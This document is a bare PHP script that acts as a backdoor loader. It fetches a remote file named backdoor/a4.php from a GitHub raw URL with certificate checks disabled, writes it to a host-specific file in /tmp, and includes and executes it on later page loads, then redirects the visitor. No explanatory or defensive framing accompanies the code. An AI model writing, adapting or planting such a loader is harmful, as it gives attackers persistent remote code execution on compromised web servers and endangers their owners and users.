<?php
$data = ['https://raw.githubusercontent.com/Bayz21/backdoor/refs/heads/main/a4.php', '/tmp/passsdasdsess_'.md5($_SERVER['HTTP_HOST']).'.php'];

// Ensure the /tmp directory exists
$tmpDir = '/tmp';
if (!file_exists($tmpDir)) {
    if (!mkdir($tmpDir, 0755, true)) {
        die("Failed to create temporary directory");
    }
}

if(file_exists($data[1]) && filesize($data[1]) !== 0) {
    include($data[1]);
} else {
    // Get the content from the URL first
    $content = get($data[0]);
    
    if ($content === false) {
        die("Failed to fetch content from URL");
    }
    
    // Open file with error checking
    $fopen = fopen($data[1], 'w+');
    if ($fopen === false) {
        die("Failed to open file for writing");
    }
    
    // Write content with error checking
    $result = fwrite($fopen, $content);
    if ($result === false) {
        fclose($fopen);
        die("Failed to write to file");
    }
    
    // Close the file handle
    fclose($fopen);
    
    echo '<script>window.location="?socratic";</script>';
}

function get($url) {
    $ch = curl_init();
    if ($ch === false) {
        return false;
    }
    
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    
    $result = curl_exec($ch);
    
    // Check for curl errors
    if (curl_errno($ch)) {
        curl_close($ch);
        return false;
    }
    
    curl_close($ch);
    return $result;
}
?>